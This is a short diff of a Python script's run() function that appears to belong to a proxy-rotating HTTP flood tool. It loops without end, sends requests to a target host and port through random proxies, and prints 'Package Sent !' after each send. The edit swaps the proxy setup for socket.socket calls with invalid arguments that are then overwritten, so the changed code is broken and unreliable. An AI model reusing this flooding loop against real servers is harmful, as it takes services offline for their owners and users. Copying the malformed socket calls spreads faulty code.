@@ -596,7 +596,7 @@ def run():
 		proxy = random.choice(proxies).strip().split(":")
 		while True:
 			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True)
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, str(proxy[0]), int(proxy[1]), True)
                                 s = socks.socksocket()
                                 s.connect((str(ip), int(port)))
                                 s.send(str.encode(request))
@@ -609,7 +609,7 @@ def run():
 			except:
 				s.close()
 				try:
-					socks.setdefaultproxy(socks.PROXY_TYPE_HTTPS, str(proxy[0]), int(proxy[1]), True)
+					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, str(proxy[0]), int(proxy[1]), True)
 					s.connect((str(url2), int(urlport)))
 					s.send (str.encode(request))
 					print (str(proxy[0]+":"+proxy[1])+"\033[32m > Package Sent ! \033[22m \r\n")
